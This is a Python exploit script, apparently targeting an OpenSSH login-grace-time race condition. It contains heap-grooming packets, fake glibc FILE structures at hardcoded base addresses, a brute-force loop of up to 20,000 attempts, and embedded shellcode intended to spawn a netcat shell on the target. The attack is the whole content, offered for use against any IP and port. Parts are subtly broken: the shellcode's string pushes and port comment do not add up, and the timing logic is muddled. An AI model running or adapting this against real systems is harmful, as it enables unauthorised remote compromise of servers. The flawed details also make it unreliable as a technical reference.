import socket
import struct
import time
import random
import fcntl
import os

MAX_PACKET_SIZE = 256 * 1024
LOGIN_GRACE_TIME = 120
MAX_STARTUPS = 100
GLIBC_BASES = [0xb7200000, 0xb7400000]
NUM_GLIBC_BASES = len(GLIBC_BASES)

shellcode = (
    b"\x31\xc0"              # xor    %eax,%eax          ; Clear the EAX register
    b"\x50"                  # push   %eax               ; Push a null byte
    b"\x68\x2f\x62\x61\x73"  # push   $0x7361622f        ; Push "/bas" (part of "/bin/bash")
    b"\x68\x2f\x62\x69\x6e"  # push   $0x6e69622f        ; Push "/bin"
    b"\x89\xe3"              # mov    %esp,%ebx          ; Move the stack pointer to EBX
    b"\x50"                  # push   %eax               ; Push a null byte (end of string)
    b"\x68\x63\x20\x2d\x65"  # push   $0x652d2063        ; Push "c -e"
    b"\x68\x2d\x6c\x70\x20"  # push   $0x20706c2d        ; Push "-lp "
    b"\x68\x2f\x6e\x63\x20"  # push   $0x20636e2f        ; Push "/nc "
    b"\x68\x30\x30\x31\x30"  # push   $0x30313030        ; Push "0010" (port 9001 in reverse)
    b"\x68\x30\x2e\x30\x2e"  # push   $0x2e302e30        ; Push ".0.0"
    b"\x68\x31\x30\x2e\x31"  # push   $0x312e3031        ; Push "10.1"
    b"\x89\xe1"              # mov    %esp,%ecx          ; Move the stack pointer to ECX
    b"\x50"                  # push   %eax               ; Push a null byte (end of string)
    b"\x51"                  # push   %ecx               ; Push the string address
    b"\x53"                  # push   %ebx               ; Push the "/bin/bash" address
    b"\x89\xe1"              # mov    %esp,%ecx          ; Move the stack pointer to ECX
    b"\xb0\x0b"              # mov    $0xb,%al           ; Move syscall number 11 (execve) to EAX
    b"\xcd\x80"              # int    $0x80              ; Trigger syscall
)

def setup_connection(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.setblocking(0)  # Set socket to non-blocking mode
    return sock

def send_packet(sock, packet_type, data):
    packet_len = len(data) + 5
    packet = struct.pack('!I', packet_len) + struct.pack('B', packet_type) + data
    sock.sendall(packet)

def prepare_heap(sock):
    for _ in range(10):
        tcache_chunk = b'A' * 64
        send_packet(sock, 5, tcache_chunk)

    for _ in range(27):
        large_hole = b'B' * 8192
        send_packet(sock, 5, large_hole)
        small_hole = b'C' * 320
        send_packet(sock, 5, small_hole)

    for _ in range(27):
        fake_data = create_fake_file_structure(GLIBC_BASES[0])
        send_packet(sock, 5, fake_data)

    large_string = b'E' * (MAX_PACKET_SIZE - 1)
    send_packet(sock, 5, large_string)

def create_fake_file_structure(glibc_base):
    fake_file = bytearray(4096)
    fake_file[0:8] = struct.pack('Q', 0)  # _IO_read_ptr
    fake_file[-16:-8] = struct.pack('Q', glibc_base + 0x21b740)  # fake vtable
    fake_file[-8:] = struct.pack('Q', glibc_base + 0x21d7f8)  # fake _codecvt
    return bytes(fake_file)

def time_final_packet(sock):
    parsing_time = measure_response_time(sock, 1)
    time_after = measure_response_time(sock, 2)
    parsing_time = time_after - parsing_time
    print(f"Estimated parsing time: {parsing_time:.6f} seconds")
    return parsing_time

def measure_response_time(sock, error_type):
    if error_type == 1:
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3"
    else:
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9"

    start = time.monotonic()
    send_packet(sock, 50, error_packet)
    response = sock.recv(1024)
    end = time.monotonic()
    elapsed = end - start
    return elapsed

def create_public_key_packet(glibc_base):
    packet = bytearray(MAX_PACKET_SIZE)
    for i in range(27):
        offset = i * (4096 + 304)
        packet[offset:offset+4096] = b'\x00' * 4096
        packet[offset+4096:offset+4096+304] = b'\x00' * 304

    packet[:8] = b"ssh-rsa "
    offset = (4096 * 13) + (304 * 13)
    packet[offset:offset+len(shellcode)] = shellcode

    for i in range(27):
        offset = (i + 1) * 4096 + i * 304
        packet[offset:offset+304] = create_fake_file_structure(glibc_base)

    return bytes(packet)

def attempt_race_condition(sock, parsing_time, glibc_base):
    final_packet = create_public_key_packet(glibc_base)
    sock.sendall(final_packet[:-1])

    start = time.monotonic()
    while True:
        current = time.monotonic()
        elapsed = current - start
        if elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001):
            sock.sendall(final_packet[-1:])
            break

    response = sock.recv(1024)
    if response and b"SSH-2.0-" not in response:
        print("Possible hit on 'large' race window")
        return True
    return False

def main(ip, port):
    parsing_time = 0
    success = False

    random.seed(time.time())

    for glibc_base in GLIBC_BASES:
        print(f"Attempting exploitation with glibc base: 0x{glibc_base:x}")

        for attempt in range(20000):
            if attempt % 1000 == 0:
                print(f"Attempt {attempt} of 20000")

            try:
                sock = setup_connection(ip, port)
                send_packet(sock, 5, b'\x00' * 36)
                parsing_time = time_final_packet(sock)
                if attempt_race_condition(sock, parsing_time, glibc_base):
                    print(f"Possible exploitation success on attempt {attempt} with glibc base 0x{glibc_base:x}!")
                    success = True
                    break
                sock.close()
                time.sleep(0.1)  # 100ms delay between attempts
            except Exception as e:
                print(f"Attempt {attempt} failed: {e}")

        if success:
            break

    return not success

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    sys.exit(main(ip, port))
